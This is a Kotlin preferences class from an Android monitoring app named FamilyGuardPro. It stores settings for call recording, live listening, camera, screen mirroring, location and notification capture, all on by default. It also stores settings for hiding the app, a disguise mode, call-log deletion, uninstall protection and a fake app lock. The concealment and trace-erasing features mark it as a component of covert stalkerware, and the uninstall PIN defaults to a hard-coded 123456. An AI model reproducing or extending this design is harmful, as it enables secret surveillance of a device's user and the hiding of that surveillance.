package com.familyguardpro.utils

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

class PreferenceManager(context: Context) {
    
    companion object {
        private const val PREF_NAME = "familyguard_prefs"
        private const val KEY_AUTH_TOKEN = "auth_token"
        private const val KEY_USER_ID = "user_id"
        private const val KEY_USER_EMAIL = "user_email"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_ANDROID_ID = "android_id"
        private const val KEY_IS_CHILD_MODE = "is_child_mode"
        private const val KEY_IS_SETUP_COMPLETE = "is_setup_complete"
        private const val KEY_IS_HIDDEN = "is_hidden"
        private const val KEY_FCM_TOKEN = "fcm_token"
        private const val KEY_SERVER_URL = "server_url"
        private const val KEY_LAST_SYNC_TIME = "last_sync_time"
        private const val KEY_CALL_RECORDING_ENABLED = "call_recording_enabled"
        private const val KEY_SCREEN_MIRROR_ENABLED = "screen_mirror_enabled"
        private const val KEY_CAMERA_ENABLED = "camera_enabled"
        private const val KEY_LIVE_LISTEN_ENABLED = "live_listen_enabled"
        private const val KEY_LOCATION_ENABLED = "location_enabled"
        private const val KEY_PARENT_ID = "parent_id"
    }
    
    private val prefs: SharedPreferences
    
    init {
        val masterKey = MasterKey.Builder(context)
            .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
            .build()
        
        prefs = EncryptedSharedPreferences.create(
            context,
            PREF_NAME,
            masterKey,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
        )
    }
    
    // Auth
    fun setAuthToken(token: String) {
        prefs.edit().putString(KEY_AUTH_TOKEN, token).apply()
    }
    
    fun clearAuthToken() {
        prefs.edit().remove(KEY_AUTH_TOKEN).apply()
    }
    
    fun getAuthToken(): String? = prefs.getString(KEY_AUTH_TOKEN, null)
    
    fun setUserId(userId: String) {
        prefs.edit().putString(KEY_USER_ID, userId).apply()
    }
    
    fun getUserId(): String? = prefs.getString(KEY_USER_ID, null)
    
    fun setUserEmail(email: String) {
        prefs.edit().putString(KEY_USER_EMAIL, email).apply()
    }
    
    fun getUserEmail(): String? = prefs.getString(KEY_USER_EMAIL, null)
    
    // Device
    fun setDeviceId(deviceId: String) {
        prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
    }
    
    fun getDeviceId(): String = prefs.getString(KEY_DEVICE_ID, "") ?: ""
    
    fun setAndroidId(androidId: String) {
        prefs.edit().putString(KEY_ANDROID_ID, androidId).apply()
    }
    
    fun getAndroidId(): String? = prefs.getString(KEY_ANDROID_ID, null)
    
    // Mode
    fun setChildMode(isChild: Boolean) {
        prefs.edit().putBoolean(KEY_IS_CHILD_MODE, isChild).apply()
    }
    
    fun setIsChild(isChild: Boolean) {
        setChildMode(isChild)
    }
    
    fun isChildMode(): Boolean = prefs.getBoolean(KEY_IS_CHILD_MODE, false)
    
    fun setSetupComplete(complete: Boolean) {
        prefs.edit().putBoolean(KEY_IS_SETUP_COMPLETE, complete).apply()
    }
    
    fun isSetupComplete(): Boolean = prefs.getBoolean(KEY_IS_SETUP_COMPLETE, false)
    
    fun setHidden(hidden: Boolean) {
        prefs.edit().putBoolean(KEY_IS_HIDDEN, hidden).apply()
    }
    
    fun isHidden(): Boolean = prefs.getBoolean(KEY_IS_HIDDEN, false)
    
    // FCM
    fun setFcmToken(token: String) {
        prefs.edit()
            .putString(KEY_FCM_TOKEN, token)
            .putLong("fcm_token_refresh_time", System.currentTimeMillis())
            .apply()
    }
    
    fun getFcmToken(): String? = prefs.getString(KEY_FCM_TOKEN, null)
    
    fun getLastFcmTokenRefresh(): Long = prefs.getLong("fcm_token_refresh_time", 0L)
    
    fun clearFcmToken() {
        prefs.edit()
            .remove(KEY_FCM_TOKEN)
            .remove("fcm_token_refresh_time")
            .apply()
    }
    
    // Server
    fun setServerUrl(url: String) {
        prefs.edit().putString(KEY_SERVER_URL, url).apply()
    }
    
    fun getServerUrl(): String = prefs.getString(KEY_SERVER_URL, "https://safeguard--idhighprice.replit.app/") ?: "https://safeguard--idhighprice.replit.app/"
    
    // Sync
    fun setLastSyncTime(time: Long) {
        prefs.edit().putLong(KEY_LAST_SYNC_TIME, time).apply()
    }
    
    fun getLastSyncTime(): Long = prefs.getLong(KEY_LAST_SYNC_TIME, 0)
    
    // Features
    fun setCallRecordingEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_CALL_RECORDING_ENABLED, enabled).apply()
    }
    
    fun isCallRecordingEnabled(): Boolean = prefs.getBoolean(KEY_CALL_RECORDING_ENABLED, true)
    
    fun setScreenMirrorEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_SCREEN_MIRROR_ENABLED, enabled).apply()
    }
    
    fun isScreenMirrorEnabled(): Boolean = prefs.getBoolean(KEY_SCREEN_MIRROR_ENABLED, true)
    
    fun setCameraEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_CAMERA_ENABLED, enabled).apply()
    }
    
    fun isCameraEnabled(): Boolean = prefs.getBoolean(KEY_CAMERA_ENABLED, true)
    
    fun setLiveListenEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_LIVE_LISTEN_ENABLED, enabled).apply()
    }
    
    fun isLiveListenEnabled(): Boolean = prefs.getBoolean(KEY_LIVE_LISTEN_ENABLED, true)
    
    fun setLocationEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_LOCATION_ENABLED, enabled).apply()
    }
    
    fun isLocationEnabled(): Boolean = prefs.getBoolean(KEY_LOCATION_ENABLED, true)
    
    // Parent
    fun setParentId(parentId: String) {
        prefs.edit().putString(KEY_PARENT_ID, parentId).apply()
    }
    
    fun getParentId(): String? = prefs.getString(KEY_PARENT_ID, null)
    
    // Clear all
    fun clearAll() {
        prefs.edit().clear().apply()
    }
    
    fun clear() {
        clearAll()
    }
    
    // Logout (keep device settings)
    fun logout() {
        prefs.edit()
            .remove(KEY_AUTH_TOKEN)
            .remove(KEY_USER_ID)
            .remove(KEY_USER_EMAIL)
            .apply()
    }
    
    // Call log deletion
    fun isCallLogDeletionEnabled(): Boolean = prefs.getBoolean("call_log_deletion_enabled", true)
    
    fun setCallLogDeletionEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("call_log_deletion_enabled", enabled).apply()
    }
    
    // Notification capture
    fun isNotificationCaptureEnabled(): Boolean = prefs.getBoolean("notification_capture_enabled", true)
    
    fun setNotificationCaptureEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("notification_capture_enabled", enabled).apply()
    }
    
    // Blocked apps
    fun getBlockedApps(): Set<String> {
        return prefs.getStringSet("blocked_apps", emptySet()) ?: emptySet()
    }
    
    fun setBlockedApps(apps: Set<String>) {
        prefs.edit().putStringSet("blocked_apps", apps).apply()
    }
    
    fun isAppBlocked(packageName: String): Boolean {
        return getBlockedApps().contains(packageName)
    }
    
    // Disguise Mode
    fun getDisguiseMode(): String {
        return prefs.getString("disguise_mode", "normal") ?: "normal"
    }
    
    fun setDisguiseMode(mode: String) {
        prefs.edit().putString("disguise_mode", mode).apply()
    }
    
    // Admin PIN (for revealing hidden app)
    fun getAdminPin(): String {
        return prefs.getString("admin_pin", "123456") ?: "123456"
    }
    
    fun setAdminPin(pin: String) {
        prefs.edit().putString("admin_pin", pin).apply()
    }
    
    // Parent PIN (alias for admin PIN - used for uninstall protection)
    fun getParentPin(): String {
        return getAdminPin()
    }
    
    fun setParentPin(pin: String) {
        setAdminPin(pin)
    }

    // App Lock PIN (for fake app lock)
    fun getAppLockPin(): String {
        return prefs.getString("applock_pin", "") ?: ""
    }
    
    fun setAppLockPin(pin: String) {
        prefs.edit().putString("applock_pin", pin).apply()
    }
    
    // Locked Apps (for fake app lock)
    fun getLockedApps(): Set<String> {
        return prefs.getStringSet("locked_apps", emptySet()) ?: emptySet()
    }
    
    fun setLockedApps(apps: Set<String>) {
        prefs.edit().putStringSet("locked_apps", apps).apply()
    }
    
    // Check if app is configured (paired)
    fun isConfigured(): Boolean {
        return getDeviceId().isNotEmpty() && isSetupComplete()
    }
    
    // ============== AppLock Extended Features ==============
    
    // Lock Method (pin, pattern, biometric)
    fun getLockMethod(): String {
        return prefs.getString("applock_method", "pin") ?: "pin"
    }
    
    fun setLockMethod(method: String) {
        prefs.edit().putString("applock_method", method).apply()
    }
    
    // Pattern Lock
    fun getLockPattern(): String {
        return prefs.getString("applock_pattern", "") ?: ""
    }
    
    fun setLockPattern(pattern: String) {
        prefs.edit().putString("applock_pattern", pattern).apply()
    }
    
    // Biometric Enabled
    fun isBiometricEnabled(): Boolean {
        return prefs.getBoolean("applock_biometric", false)
    }
    
    fun setBiometricEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("applock_biometric", enabled).apply()
    }
    
    // Intruder Selfie
    fun isIntruderSelfieEnabled(): Boolean {
        return prefs.getBoolean("applock_intruder_selfie", true)
    }
    
    fun setIntruderSelfieEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("applock_intruder_selfie", enabled).apply()
    }
    
    // Re-lock Time (0=immediately, 1=screen off, 2=1min, 3=5min, 4=30min)
    fun getRelockTime(): Int {
        return prefs.getInt("applock_relock_time", 1)
    }
    
    fun setRelockTime(time: Int) {
        prefs.edit().putInt("applock_relock_time", time).apply()
    }
    
    // Hide Pattern Path
    fun isHidePatternEnabled(): Boolean {
        return prefs.getBoolean("applock_hide_pattern", false)
    }
    
    fun setHidePatternEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("applock_hide_pattern", enabled).apply()
    }
    
    // Fake Cover Enabled
    fun isFakeCoverEnabled(): Boolean {
        return prefs.getBoolean("applock_fake_cover", false)
    }
    
    fun setFakeCoverEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("applock_fake_cover", enabled).apply()
    }
    
    // AppLock Service Enabled
    fun isAppLockServiceEnabled(): Boolean {
        return prefs.getBoolean("applock_service_enabled", false)
    }
    
    fun setAppLockServiceEnabled(enabled: Boolean) {
        prefs.edit().putBoolean("applock_service_enabled", enabled).apply()
    }
}
